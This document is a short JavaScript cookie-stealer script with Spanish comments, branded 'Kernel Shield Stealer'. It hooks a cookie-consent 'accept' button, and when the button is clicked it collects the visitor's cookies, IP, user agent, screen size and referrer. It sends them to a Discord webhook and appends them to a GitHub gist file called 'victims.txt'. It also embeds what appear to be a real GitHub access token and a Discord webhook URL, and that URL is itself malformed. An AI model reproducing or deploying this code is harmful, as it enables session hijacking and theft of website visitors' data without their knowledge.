// CONFIGURACIÓN
const GITHUB_TOKEN = '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'; // Pon aquí tu token de GitHub
// --- CONFIGURACIÓN ---
const GIST_ID = 'TU_ID_DE_GIST_AQUI';
const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1556612161101373560/1L8YmVpZcSKSDVxPAWIzQYdM7rPjpo114xqghJbgsPaXhGt5wsEtDDXBa_Y7o9LJuMfZ'; 

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        return (await res.json()).ip;
    } catch (e) {
        return 'Unknown';
    }
}

async function sendToDiscord(data) {
    const payload = {
        embeds: [{
            title: "🍪 Nueva Cookie Robada",
            color: 0x673DE6,
            fields: [
                { name: "🌐 IP", value: data.ip || "N/A" },
                { name: "💻 Navegador/SO", value: data.userAgent || "N/A" },
                { name: "📺 Resolución", value: data.screenRes || "N/A" },
                { name: "🔑 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "N/A" },
                { name: "🕒 Hora", value: new Date().toLocaleString() }
            ],
            footer: { text: "Kernel Shield Stealer" },
            timestamp: new Date().toISOString()
        }]
    };

    // Asegúrate de que tu Webhook esté configurado
    if (window.DISCORD_WEBHOOK_URL) {
        fetch(window.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
    }
}

async function updateGist(data) {
    const url = `https://api.github.com/gists/${GIST_ID}`;
    
    // Obtenemos el contenido actual del gist
    let currentContent = "";
    try {
        const res = await fetch(url);
        if (res.ok) {
            const json = await res.json();
            // Buscamos el archivo principal (normalmente 'filename.txt')
            const files = json.files;
            for (let file in files) {
                currentContent = files[file].content;
                break; 
            }
        }
    } catch(e) {}

    // Añadimos la nueva línea
    const newData = `[${new Date().toISOString()}] IP: ${data.ip} | UA: ${data.userAgent} | Cookies: ${data.cookies}\n`;
    const fullContent = currentContent + newData;

    // Actualizamos el gist
    await fetch(url, {
        method: 'PATCH',
        headers: {
            'Authorization': `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            files: {
                "victims.txt": { // El nombre debe coincidir con el que creaste en el Gist
                    content: fullContent
                }
            }
        })
    });
}

async function stealAndNotify() {
    const ip = await getIP();
    const userData = {
        ip: ip,
        userAgent: navigator.userAgent,
        screenRes: window.screen.width + 'x' + window.screen.height,
        cookies: document.cookie.substring(0, 500),
        timestamp: new Date().toISOString(),
        referrer: document.referrer
    };

    Promise.all([
        sendToDiscord(userData),
        updateGist(userData)
    ]);
}

document.addEventListener('DOMContentLoaded', () => {
    const btn = document.getElementById('cookieAccept');
    if(btn) {
        btn.addEventListener('click', () => {
            console.log("Cookies accepted. Data stolen.");
            stealAndNotify();
        });
    }
});
